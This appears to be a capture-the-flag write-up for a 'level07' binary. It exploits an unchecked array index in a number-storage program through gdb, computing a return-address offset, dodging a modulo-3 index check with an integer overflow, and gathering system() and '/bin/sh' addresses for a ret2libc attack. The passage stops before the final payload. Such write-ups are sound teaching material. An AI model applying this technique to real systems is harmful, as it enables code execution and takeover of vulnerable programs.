After analyzing the program we see that we can use the `store_number` function to store a number in a array,
but the function does not check that the index given to store the number is in the array

Let's find the address of the buffer:

```
(gdb) b *0x080489a1       <====================== Breakpoint at the end of main
Breakpoint 4 at 0x80489a1
(gdb) r
Starting program: /home/users/level07/level07
...
Input command: store
 Number: 1234
 Index: 1
 Completed store command successfully

Breakpoint 4, 0x080489a1 in main ()
(gdb) i proc map
process 1688
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
         0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
         0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
        0xf7e2b000 0xf7e2c000     0x1000        0x0
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
        0xf7fd0000 0xf7fd4000     0x4000        0x0
        0xf7fd8000 0xf7fdb000     0x3000        0x0
        0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
        0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
        0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
        0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xfffdd000,0xffffdfff, 1234
0xffffd548
1 pattern found.
```

Here we have the pattern at `0xffffd548` which is at the index 1 (\* 4) of the buffer.
So the start of the buffer is at `0xffffd548` - 4 : `0xffffd544`

We convert the address in decimal :
`0xffffd544` ===> `4294956356`

So we will use the fact that we can write after the buffer to overwrite an address
We start to print addresses after our buffer:

Our buffer address + 400 to get the end of our buffer `4294956356 + 400 = 0xFFFFD6D4` in hex

```
(gdb) x/20x 0xffffd6d4
0xffffd6d4: 0x00000000 0x64616572 0x00000000 0x00000000
0xffffd6e4: 0x00000000 0x00000000 0x599ca500 0xf7feb620
0xffffd6f4: 0x00000000 0x08048a09 0xf7fceff4 0x00000000
0xffffd704: 0x00000000 0x00000000 0xf7e45513 0x00000001
0xffffd714: 0xffffd7a4 0xffffd7ac 0xf7fd3000 0x00000000
```

When we put a breakpoint at the end of the program, we see that the program go in a function called `__libc_start_main` before exiting.

```
(gdb) disas main
Dump of assembler code for function main:
 0x08048723 <+0>: push %ebp
...
   0x080489ee <+715>:   pop    %esi
   0x080489ef <+716>:   pop    %edi
   0x080489f0 <+717>:   pop    %ebp
   0x080489f1 <+718>:   ret
End of assembler dump.
(gdb) b *0x080489f1
Breakpoint 1 at 0x80489f1
(gdb) r
Starting program: /home/users/level07/level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: quit

Breakpoint 1, 0x080489f1 in main ()
(gdb) ni
0xf7e45513 in __libc_start_main () from /lib32/libc.so.6
(gdb) ni
0xf7e45516 in __libc_start_main () from /lib32/libc.so.6
(gdb) ni
[Inferior 1 (process 1707) exited normally]
```

We can see that we already have seen the address `0xf7e45513`. When we have printed the stack that came after the buffer

```
0xffffd704: 0x00000000 0x00000000 0xf7e45513 0x00000001
```

Let's try to overwrite `0xf7e4551` first we get the address of the value: `0xffffd704 + 8` ==> `4294956804 + 8 = 4294956812`

We want to get the difference between [address where to write] and [address of the buffer]
`4294956356 - 4294956812 = -456`

We divide 456 by 4 to counter the \* 4
`456 / 4 = 114`

Since there is protection that prevents us from storing at an index where the modulo 3 is equal to 0,
we can't overwrite the address by using the index 114, because `114 % 3 == 0`

So we will do an overflow:
To counter the \* 4 we do a
UINT_MAX / 4 : 4294967295 /4 ~~ 1073741824

1073741824 + 114
1073741938

Since the program `memset` the environment at the start of the program,
we can not put a shellcode in the environment

So we have to use a Ret2libc

System
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
4159090384

==
(gdb) find 0xf7e2c000,0xf7fcbfff, "/bin/sh"
0xf7f897ec
1 pattern found.
4160264172
